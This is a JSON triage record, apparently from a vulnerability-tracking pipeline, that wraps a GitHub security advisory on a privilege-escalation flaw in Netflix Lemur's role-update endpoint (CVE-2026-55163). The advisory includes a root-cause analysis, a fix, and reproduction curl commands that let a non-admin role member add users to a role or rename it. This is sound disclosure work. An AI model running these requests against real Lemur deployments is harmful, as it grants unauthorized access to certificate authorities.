@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/288231323?v=4\", \"events_url\": \"https://api.github.com/users/sour-exploit/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/sour-exploit/followers\", \"following_url\": \"https://api.github.com/users/sour-exploit/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/sour-exploit/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/sour-exploit\", \"id\": 288231323, \"login\": \"sour-exploit\", \"node_id\": \"U_kgDOES4Pmw\", \"organizations_url\": \"https://api.github.com/users/sour-exploit/orgs\", \"received_events_url\": \"https://api.github.com/users/sour-exploit/received_events\", \"repos_url\": \"https://api.github.com/users/sour-exploit/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/sour-exploit/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/sour-exploit/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/sour-exploit\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55163\", \"cvss\": {\"score\": 6.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-863\", \"name\": \"Incorrect Authorization\"}], \"description\": \"## Summary\\n \\nThe `PUT /api/1/roles/<id>` handler in `lemur/roles/views.py` gates only on `RoleMemberPermission(role_id).can()`, which is satisfied for any user who is already a member of the target role. The handler then passes `data[\\\"users\\\"]` and `data[\\\"name\\\"]` directly to `service.update()`, permitting any role member to rewrite that role's membership list and name. The companion `DELETE` handler on the same resource is correctly gated by `@admin_permission.require`; the asymmetry between PUT and DELETE on identical resources indicates an authorization oversight rather than a deliberate design choice.\\n \\n## Root Cause\\n \\n`lemur/roles/views.py:298`:\\n \\n```python\\npermission = RoleMemberPermission(role_id)\\nif permission.can():\\n    return service.update(\\n        role_id, data[\\\"name\\\"], data.get(\\\"description\\\"), data.get(\\\"users\\\")\\n    )\\nreturn dict(message=\\\"You are not authorized to modify this role.\\\"), 403\\n \\n@admin_permission.require(http_exception=403)\\ndef delete(self, role_id):\\n    ...\\n```\\n \\n`lemur/auth/permissions.py:56`:\\n \\n```python\\nclass RoleMemberPermission(Permission):\\n    def __init__(self, role_id):\\n        needs = [RoleNeed(\\\"admin\\\"), RoleMemberNeed(role_id)]\\n        super().__init__(*needs)\\n```\\n \\n`flask_principal.Permission.allows()` is OR-semantic across needs, so `RoleMemberPermission(role_id).can()` returns `True` if the caller is either an admin **or** a member of `role_id`. The PUT handler treats membership-of-self as sufficient to mutate the role; DELETE does not.\\n \\n## Affected Endpoints\\n \\n| Method | Path | Source |\\n|---|---|---|\\n| PUT | /api/1/roles/`<id>` | lemur/roles/views.py:298 |\\n \\n## Impact\\n \\nA user who is a member of role X can:\\n \\n- **Add other users to role X**, granting them whatever certificate/authority access role X confers. In installs that delegate certificate or authority ownership to non-admin roles, this promotes arbitrary users to peer of every other role member.\\n- **Remove other users from role X**, denying their access (availability / governance impact).\\n- **Rename role X** to an arbitrary string.\\nThe \\\"rename to admin\\\" path is blocked by the `unique=True` constraint on `Role.name` and by strict equality in `User.is_admin`, so direct self-promotion to admin via rename is not possible on default installs. The principal exploitation surface is membership rewriting and lateral promotion of colluders within roles the attacker already belongs to.\\n \\n## Remediation\\n \\nAdd `@admin_permission.require(http_exception=403)` to `Roles.put`, mirroring the existing decorator on `Roles.delete`:\\n \\n```python\\n@admin_permission.require(http_exception=403)\\ndef put(self, role_id, data=None):\\n    ...\\n```\\n \\nIf selective delegation is intended (role owners managing their own roles), that capability should be modeled with a dedicated permission class whose Needs reflect role *ownership* rather than membership, and the `name` field should be excluded from the mutable schema on that delegated path.\\n \\n## Steps to Reproduce\\n \\n1. Set up Lemur with default configuration. Create an admin user `admin`, and two non-admin users `alice` and `bob`. Add `alice` to the built-in `operator` role; leave `bob` with no roles or with `read-only` only.\\n2. Authenticate as `alice` and capture the JWT:\\n   ```\\n   curl -X POST https://lemur.local/api/1/auth/login \\\\\\n        -H \\\"Content-Type: application/json\\\" \\\\\\n        -d '{\\\"username\\\":\\\"alice\\\",\\\"password\\\":\\\"<alice_pw>\\\"}'\\n   ```\\n \\n3. Confirm the initial state - `bob` is not a member of `operator`:\\n   ```\\n   curl https://lemur.local/api/1/roles?filter=name;operator \\\\\\n        -H \\\"Authorization: Bearer <admin_jwt>\\\"\\n   # observe: alice present in users list, bob absent\\n   ```\\n \\n4. As `alice`, send a PUT that injects `bob` into the `operator` role:\\n   ```\\n   curl -X PUT https://lemur.local/api/1/roles/<operator_role_id> \\\\\\n        -H \\\"Authorization: Bearer <alice_jwt>\\\" \\\\\\n        -H \\\"Content-Type: application/json\\\" \\\\\\n        -d '{\\n              \\\"name\\\": \\\"operator\\\",\\n              \\\"description\\\": \\\"modified by alice\\\",\\n              \\\"users\\\": [{\\\"id\\\": <alice_id>}, {\\\"id\\\": <bob_id>}]\\n            }'\\n   # observe: HTTP 200\\n   ```\\n \\n5. Confirm `bob` is now a member of `operator`:\\n   ```\\n   curl https://lemur.local/api/1/roles?filter=name;operator \\\\\\n        -H \\\"Authorization: Bearer <admin_jwt>\\\"\\n   # observe: bob now present in users list\\n   ```\\n \\nStep 4 succeeds despite `alice` not being an admin. The same handler also accepts a `name` field; substituting `\\\"name\\\": \\\"operator_v2\\\"` in step 4 renames the role, demonstrating the second variant of the bug.\", \"ghsa_id\": \"GHSA-x3vf-mgxj-7785\", \"github_reviewed_at\": \"2026-06-25T22:01:18Z\", \"html_url\": \"https://github.com/advisories/GHSA-x3vf-mgxj-7785\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-x3vf-mgxj-7785\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55163\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-25T22:01:18Z\", \"references\": [\"https://github.com/Netflix/lemur/security/advisories/GHSA-x3vf-mgxj-7785\", \"https://github.com/Netflix/lemur/releases/tag/v1.9.2\", \"https://github.com/advisories/GHSA-x3vf-mgxj-7785\"], \"repository_advisory_url\": \"https://api.github.com/repos/Netflix/lemur/security-advisories/GHSA-x3vf-mgxj-7785\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/Netflix/lemur\", \"summary\": \"Lemur Privilege Escalation: Non-admin role members can rewrite role membership via PUT /api/1/roles/<id>\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-25T22:01:20Z\", \"url\": \"https://api.github.com/advisories/GHSA-x3vf-mgxj-7785\", \"vulnerabilities\": [{\"first_patched_version\": \"1.9.2\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"lemur\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.9.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-x3vf-mgxj-7785",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "lemur: <= 1.9.1"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-55163"
+    ],
+    "cvss_score": 6.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "lemur"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:57.163968Z",
+  "provenance": {
+    "content_sha256": "2ebe2f918495aa167b872d50df10b54dc91f47b756ab4be1286c0f598da2a6f0",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-25T22:01:18Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-x3vf-mgxj-7785",
+  "status": "active",
+  "title": "Lemur Privilege Escalation: Non-admin role members can rewrite role membership via PUT /api/1/roles/<id>",
+  "updated_at": "2026-06-25T22:01:20Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-x3vf-mgxj-7785"
+}
